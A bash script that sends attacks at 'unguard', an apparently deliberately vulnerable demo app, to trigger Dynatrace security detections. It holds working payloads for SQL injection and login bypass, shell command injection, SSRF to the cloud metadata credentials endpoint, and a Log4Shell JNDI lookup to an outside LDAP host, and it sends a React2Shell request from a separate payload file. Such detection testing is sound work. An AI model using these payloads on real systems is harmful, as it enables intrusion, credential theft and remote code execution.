#!/usr/bin/env bash
# Triggers security findings (RAP detections) + Davis problems in Dynatrace by
# exercising unguard's intentionally vulnerable endpoints.
# Each attack produces: spans (frontend -> backend -> sink), a DETECTION_FINDING,
# and a Davis PROBLEM with the attack as root cause.
set -uo pipefail

FRONTEND="${FRONTEND_ADDR:-unguard-envoy-proxy.unguard.svc.cluster.local:8080/ui}"
ATTACKER_USER="${ATTACKER_USER:-attacker}"
ATTACKER_PASS="${ATTACKER_USER}"  # unguard registers with password == username
JNDI_ENDPOINT="${JNDI_ENDPOINT:-ldap://log4shell.tools:1389/unguard-demo}"

echo "=== Unguard Security Findings Trigger ==="
echo "Frontend: http://$FRONTEND"
echo "Time:     $(date -u +%Y-%m-%dT%H:%M:%SZ)"
echo

COOKIE_JAR=$(mktemp)
trap 'rm -f "$COOKIE_JAR"' EXIT

# --- 1. Register + login attacker user ---
echo "[1/8] Registering + logging in attacker ('$ATTACKER_USER')..."
curl -s -o /dev/null -X POST "http://$FRONTEND/api/auth/register" \
  -H 'Content-Type: application/json' \
  -d "{\"username\":\"$ATTACKER_USER\",\"password\":\"$ATTACKER_PASS\"}"
curl -s -c "$COOKIE_JAR" -o /dev/null -X POST "http://$FRONTEND/api/auth/login" \
  -H 'Content-Type: application/json' \
  -d "{\"username\":\"$ATTACKER_USER\",\"password\":\"$ATTACKER_PASS\"}"
JWT=$(grep -o 'jwt\s*[^[:space:]]*' "$COOKIE_JAR" | awk '{print $NF}')
if [ -z "$JWT" ]; then
  echo "  ERROR: login failed; aborting" >&2
  exit 1
fi
echo "  jwt acquired (len=${#JWT})"

# --- 2. SQL injection via profile-service bio (Java, H2) ---
# Sink: DatabaseManager.updateBio -> Statement.executeUpdate (string concat)
# RAP detection: SQL_INJECTION
echo "[2/8] SQLi -> profile-service (bio UPDATE)..."
SQLI_PAYLOAD="' WHERE 1=0; SELECT H2VERSION(); --"
curl -s -o /dev/null -X POST "http://$FRONTEND/api/user/$ATTACKER_USER/bio" \
  -H 'Content-Type: application/json' \
  -b "$COOKIE_JAR" \
  -d "{\"bioText\":\"$SQLI_PAYLOAD\",\"enableMarkdown\":false}"
echo "  sent (expect 500 + RAP SQLi detection on profile-service)"

# --- 3. Command injection via profile-service markdown (Java, sh -c) ---
# Sink: BioController.markdownToHtml -> ProcessBuilder.start("sh -c echo '.. | markdown'")
# RAP detection: COMMAND_INJECTION
echo "[3/8] CMDi -> profile-service (markdown conversion)..."
CMDI_PAYLOAD=$(printf "x'; id; uname -a; #")
curl -s -o /dev/null -X POST "http://$FRONTEND/api/user/$ATTACKER_USER/bio" \
  -H 'Content-Type: application/json' \
  -b "$COOKIE_JAR" \
  --data-urlencode "bioText=$CMDI_PAYLOAD" \
  --data-urlencode "enableMarkdown=true" \
  -G "http://$FRONTEND/api/user/$ATTACKER_USER/bio"
echo "  sent (expect RAP CMDi detection on profile-service)"

# --- 4. Command injection via proxy-service image fetch (Java, curl) ---
# Sink: ProxyController.proxyUrlWithCurl -> ProcessBuilder.start("sh -c curl <url>")
# RAP detection: COMMAND_INJECTION
echo "[4/8] CMDi -> proxy-service (image url)..."
curl -s -o /dev/null -X POST "http://$FRONTEND/api/post" \
  -H 'Content-Type: application/json' \
  -b "$COOKIE_JAR" \
  -d '{"imageUrl":"example.com && id && whoami #","content":"cmdi-proxy-demo"}'
echo "  sent (expect RAP CMDi detection on proxy-service)"

# --- 5. SSRF via proxy-service metadata fetch (Java HttpClient) ---
# Sink: ProxyController.proxyUrlWithHttpClient -> httpclient.execute(url)
# RAP detection: SSRF
echo "[5/8] SSRF -> proxy-service (share-url)..."
curl -s -o /dev/null -X POST "http://$FRONTEND/api/post" \
  -H 'Content-Type: application/json' \
  -b "$COOKIE_JAR" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/","content":"ssrf-demo"}'
echo "  sent (expect RAP SSRF detection on proxy-service)"

# --- 6. SQL injection auth bypass -> user-auth-service (Node.js, MariaDB) ---
# Sink: user-auth-service login query (string concat)
# RAP detection: SQL_INJECTION
echo "[6/8] SQLi auth bypass -> user-auth-service..."
SQLI_LOGIN='admin" OR 1=0 UNION ALL SELECT "user","$2a$10$MolvAKiEajLTuAN2HtaR/O.6h8wGhl3/UPn4WUCZ4sCAtbngzWgfy",1 FROM DUAL #'
curl -s -o /dev/null -X POST "http://$FRONTEND/api/auth/login" \
  -H 'Content-Type: application/json' \
  -d "{\"username\":\"$SQLI_LOGIN\",\"password\":\"password\"}"
echo "  sent (expect RAP SQLi detection on user-auth-service)"

# --- 7. JNDI injection -> microblog-service (Log4Shell, CVE-2021-44228) ---
# Sink: slf4j/log4j2 lookup in logged post content / url
# RAP detection: JNDI_INJECTION  +  RVA finding (exploit available, vuln func in use)
echo "[7/8] JNDI -> microblog-service (Log4Shell)..."
JNDI_PAYLOAD="\${jndi:ldap://log4shell.tools:1389/unguard-demo}"
curl -s -o /dev/null -X POST "http://$FRONTEND/api/post" \
  -H 'Content-Type: application/json' \
  -b "$COOKIE_JAR" \
  -d "{\"content\":\"log4shell-demo $JNDI_PAYLOAD\",\"imageUrl\":\"$JNDI_ENDPOINT\"}"
echo "  sent (expect RAP JNDI detection + RVA CVE-2021-44228 on microblog-service)"

# --- 8. React2Shell (CVE-2025-55182) -> frontend (Next.js, unauthenticated) ---
# Sink: React Flight protocol deserialization in the Next.js server process (pre-auth, before app code)
# Signals: RVA CVE-2025-55182 on unguard-frontend + node child-process spawn IoCs
# NOTE: the exploit payload is deliberately NOT embedded in this script - endpoint AV
# (Microsoft Defender) deletes script files containing inline exploit code. It is read
# from the toolkit payload file at runtime instead.
echo "[8/8] React2Shell -> frontend (Next.js Flight RCE)..."
R2S_PAYLOAD="${REACT2SHELL_PAYLOAD:-$(dirname "$0")/exploit-toolkit/exploits/react2shell/payload/react2shell-payload.txt}"
if [ -f "$R2S_PAYLOAD" ]; then
  curl -s -o /dev/null -X POST "http://$FRONTEND/" \
    -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad" \
    -H "Next-Action: 0000000000000000000000000000000000000000" \
    --data-binary @"$R2S_PAYLOAD"
  echo "  sent (expect RVA CVE-2025-55182 on frontend + node child-process spawn IoCs)"
else
  echo "  SKIPPED: payload file not found at $R2S_PAYLOAD"
fi

echo
echo "=== All attacks dispatched ==="
echo "Wait ~2-5 min for OneAgent to ship spans + RAP detections, then check Dynatrace:"
echo "  Problems:        mcp3_query-problems (status=ACTIVE, history=30m)"
echo "  Detections:      mcp3_get-security-events-summary (eventTypes=DETECTION_FINDING, timeRange=30m)"
echo "  Spans (attack):  fetch spans | filter matchesPhrase(span.name,'/user/') or matchesPhrase(url.full,'169.254')"
echo "  Vulnerabilities: mcp3_get-dynatrace-vulnerabilities (cves=CVE-2021-44228 or CVE-2025-55182)"
echo "  React2Shell:     verify 'kubectl exec deploy/unguard-frontend -- cat /tmp/pwned.txt'"
